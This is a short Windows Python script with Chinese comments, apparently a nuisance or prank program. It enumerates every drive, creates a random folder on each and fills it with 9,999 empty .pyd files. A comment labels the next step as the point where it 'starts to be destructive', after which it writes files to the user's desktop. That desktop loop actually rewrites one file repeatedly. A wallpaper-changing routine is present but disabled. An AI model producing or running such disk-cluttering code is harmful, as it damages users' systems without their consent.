import os, sys
import string
import random
import winreg

import easygui as eg


def desktop_bg():
    def setWallpaper():
        import random
        import ctypes
        import time
        import os

        # 存储图片的文件夹
        path = r"./images/bg.jpg";

        # 设置桌面壁纸
        ctypes.windll.user32.SystemParametersInfoW(20, 1, path, 0)

    setWallpaper()


# desktop_bg()
def get_disk():
    # 获取电脑上的所有磁盘
    global disk_list
    disk_list = []
    for c in string.ascii_uppercase:
        disk = c + ':'
        if os.path.isdir(disk):
            disk_list.append(disk)
    print(disk_list)


# 在电脑上创建一大堆文件
def fill():
    # 产生一个随机数
    rand = random.randint(1, 1000)
    # 在每个磁盘里创建无数个文件
    get_disk()
    for i in disk_list:
        os.makedirs(i + "\\" + str(rand))
        for j in range(1, 10000):
            with open((str(i) + '/' + str(rand) + '/' + str(j) + '.pyd'), 'wb+') as f:
                f.close()
    # 获取桌面路径
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
    print(winreg.QueryValueEx(key, "Desktop")[0])
    # 开始有杀伤力了
    # 在桌面创建无数个文件
    for j in range(1, 100):
        with open((winreg.QueryValueEx(key, "Desktop")[0] + '\\123txt'), 'wb+') as f:
            f.close()


def main():
    print()
    # desktop_bg()
    fill()


if __name__ == '__main__':
    main()
